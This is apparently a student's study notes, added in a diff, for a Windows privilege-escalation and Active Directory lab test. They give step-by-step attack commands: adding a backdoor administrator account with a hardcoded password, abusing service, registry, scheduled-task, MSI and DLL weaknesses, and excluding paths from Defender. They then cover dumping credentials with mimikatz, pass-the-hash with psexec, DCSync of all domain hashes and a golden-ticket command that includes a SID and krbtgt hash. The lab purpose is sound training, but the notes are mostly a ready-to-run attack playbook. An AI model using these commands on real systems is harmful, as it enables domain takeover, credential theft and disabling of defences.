@@ -1,0 +1,233 @@
+>>> general
+
+0) info
+> within the notes are some instructions on how to make certain files, but they can just be downloaded from the repository :)
+> the dll, exe and msi files have been tested and should just work (username: Helpdesk & pass: L3tm3!n)
+> if they don't work you'll have to make them yourself, the notes might help you with it
+
+1) orientation
+> ip's and names (hostname, dc-name, etc.) might be outdated for skills test
+> use angry ip scanner if available
+> look for services without description
+> look for services with unquoted service paths
+> look for services running as a named user account
+> check "C:\Windows\Tasks Migrated" for weakly named tasks (single word names)
+> check "\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc" (imagepath edit)
+> use -> accesschk -uwvc "normaluser" * <- (daclsvc)
+
+2) files to download
+> sysinternals suite > https://download.sysinternals.com/files/SysinternalsSuite.zip
+> mimikatz > https://github.com/gentilkiwi/mimikatz
+> the files inside this repo (if needed)
+// > mike's dll + C code from OneDrive (if dll hijack) (use this repo instead if you want)
+// > bat2exe > https://github.com/islamadel/bat2exe/releases/download/2.1/bat2exe.exe > "access denied error"
+// > bat to exe converter > https://bat-to-exe-converter-x64.en.softonic.com/ > should work (make sure to use the 64bit exe-format)
+
+3) commands
+> whoami (check current user in terminal)
+> dir (list directory contents)
+> net user (see users on machine)
+> hostname (local domain name)
+> echo %logonserver% (domain controller name)
+> echo %path% (check path variables for dll hijack)
+> whoami /user (to get the domain SID, remove last 4 numbers)
+
+4) add user command
+> net user Helpdesk L3tm3!n /add && net localgroup administrators Helpdesk /add
+
+__________________________________________________________________________________________
+__________________________________________________________________________________________
+__________________________________________________________________________________________
+
+
+>>> privilege escalation methods
+
+// 1) remote mouse
+// > removed
+
+2) unquoted service path (method could be outdated due to bat2exe not working, use "bat to exe converter")
+> open services
+> sort by description, so services without a description appear on top
+> check if "path to executable:" has spaces and no quotes
+> example -> C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+> look for writable directory, for example C:\Program Files\Unquoted Path Service
+> services always expect an executable (.exe)
+> create folder on desktop
+> create batch file (.bat) with "[add user command]"
+> use a "bat to exe converter" (run from cmd)
+> rename to common.exe (for this example ofc)
+> place exe in C:\Program Files\Unquoted Path Service
+> run service
+> net user in cmd to check if user is added
+> if not, restart machine, run service and check again
+> if you have executable rights, maybe run exe from cmd, who knows
+
+3) weak file permission services
+> example from lab: C:\Program Files\File Permissions Service\filepermservice.exe
+> "filepermservice.exe" can be renamed
+> check steps above to make own exe
+> place exe inside C:\Program Files\File Permissions Service
+> rename old .exe to whatever
+> name your own exe to "filepermservice.exe"
+> start service
+> net user in cmd to check if user is added
+
+4) weak registry permissions (regsvc)
+> open registry editor
+> go to \HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
+> right click on imagepath -> select modify
+> edit the value data so it points to an exe you control, or
+> with bat2exe you can make a .exe that that adds an administrative user (see the notes above)
+> open services
+> look for the service that has the modified image path as the "path to executable"
+> run the service
+
+5) scheduled task
+> "C:\Windows\Tasks Migrated" may contain tasks you can exploit / configure
+> example from lab: pinger
+> "C:\Windows\Tasks Migrated" contained the task "pinger"
+> open task in notepad
+> line 5 shows the author
+> lines 15-18 indicate the user the task runs as
+> at the bottom of the file should be the command it runs
+> go to the directory of the file it runs, and check if you can change the name
+> place your own file in the directory and rename it to the filename you saw in notepad
+
+6) DACL service
+> go to services
+> check if there is a dacl service (daclsvc)
+> open cmd
+> go to where you stored your sysinternals
+> accesschk -uwvc "normaluser" *
+> it might say "RW daclsvc" (should mean you have read/write rights for the service actions listed)
+> sc config daclsvc binpath="cmd /c cmd.exe /c net user Helpdesk L3tm3!n /add && net localgroup administrators Helpdesk /add"
+> run the service
+> might have to do the sc command multiple times and run the service again
+
+7) msi exploit
+> open registry editor
+> go to:
+> Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+> and:
+> Computer\HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+> if both have "AlwaysInstallElevated" set to 1, .msi files will be executed with highest privileges
+> you might be able to install a .exe to .msi converter on the host machine
+> or easier, just use the .msi file from this repo
+
+8) dll hijack
+> last resort for privilege escalation
+> go to services
+> there may be a service that indicates a dll hijack
+> go to the properties of the service to see the path and name of the .exe it calls
+> copy the .exe to your own machine (drag n drop or shared folder)
+> open cmd on own machine
+> sc create ServiceName binPath= "C:\temp\name.exe" (insert name of .exe)
+> run service you made
+> open procmon (from sysinternals) on own machine
+> click on filter icon (ctrl+L) and add the following 2 filters:
+> [result] [is] [NAME NOT FOUND] -> click add
+> [path] [ends with] [.dll] -> click add
+> click ok
+> click on process name to sort
+> if the .exe and its dll have multiple entries (like 5+), the %path% variable might be used
+> note down the name of the dll
+> go back to the VM and open cmd
+> echo %path%
+> look if there is a writable directory listed (like C:\temp)
+> go back to own machine
+> download Mike's dll + C code from OneDrive if not done yet (or use this repo)(make sure you know the password used)
+> rename dll to the name you noted down earlier
+> copy dll to the VM
+> place dll inside the directory you found in %path%
+> run service
+> net user in cmd to check if it worked
+
+__________________________________________________________________________________________
+__________________________________________________________________________________________
+__________________________________________________________________________________________
+
+
+>>> static steps after local priv escalation
+
+1) defender exclusion:
+> defender icon on bottom right (or type virus and threat protection in search)
+> virus and threat protection
+> manage settings
+> add or remove exclusions
+> use fake admin login (".\" for local account)
+> add exclusion (folder)
+> select c drive
+
+2) download mimikatz/sysinternals
+> extract in c:\temp for easy access
+> same with sysinternals suite
+
+3) administrator hash
+> open cmd with fake admin
+> cd C:\temp\mimikatz_trunk\x64
+> mimikatz
+> privilege::debug
+> sekurlsa::logonpasswords
+> copy ntlm hash from administrator (session:service from 0)
+
+4) pth + psexec
+> sekurlsa::pth /user:administrator /domain:win10client /ntlm:hash
+> dir \\192.168.56.30\c$ (to double check privilege)
+> cd C:\temp\SysinternalsSuite
+> psexec -r name \\192.168.56.30 cmd
+
+5) on admin machine
+> whoami (should be administrator)
+> cd C:\
+> md temp (creates temp dir)
+> dir (check if temp directory was created
+> powershell
+> set-mppreference -exclusionpath C:\temp
+> (get-mppreference).exclusionpath -> checks the exluded paths
+> exit
+> cd temp
+> type "mimikatz" (do not run yet)
+
+6) copying mimikatz to admin machine
+> go to original mimikatz cmd (or open new one)
+> sekurlsa::pth /user:administrator /domain:win10client /ntlm:hash
+> in the new cmd window
+> net use x: \\192.168.56.30\c$
+> x:
+> cd temp
+> get ready to switch to admin window from step 5
+> copy C:\temp\mimikatz_trunk\x64\*.* .
+> immediately run mimikatz on admin machine (might fail due to psexec being slow sometimes)
+> successful if mimikatz is visible on admin machine
+> if attempt failed, use a different letter for the net use command and try again
+
+7) domain admin hash
+> privilege::debug
+> sekurlsa::logonpasswords
+> copy domain admin hash (should be the first one)
+> let teacher know if domain admin (domad) doesn't show up
+
+8) dcsync on domain controller
+> close both admin cmd windows (you dont need them anymore)
+> go to original mimikatz cmd (or open new one)
+> sekurlsa::pth /user:domad /domain:adlab.local ntlm:hash
+> dir \\192.168.56.10\c$
+> cd C:\temp\SysinternalsSuite
+> mimikatz
+> privilege::debug
+> lsadump::dcsync /domain:adlab.local /all /csv
+> copy krbtgt hash
+> close window
+
+9) golden ticket
+> open a normal cmd windows
+> whoami /user (copy SID except last 4 digits)
+> go to mimikatz
+> kerberos::golden /domain:adlab.local /sid:S-1-5-21-3704816349-2630934885-840893638 /rc4:cc326e8519157da4bf8ef543b8680dc3 /user:abcdef /id:500 /ptt
+
+> or.. save for later:
+> kerberos::golden /domain:adlab.local /sid:S-1-5-21-3704816349-2630934885-840893638 /rc4:cc326e8519157da4bf8ef543b8680dc3 /user:abcdef /id:500 /ptt
+> kerberos::ptt ticket.kirbi
+> misc::cmd
+
+> dir \\win2019dc\c$
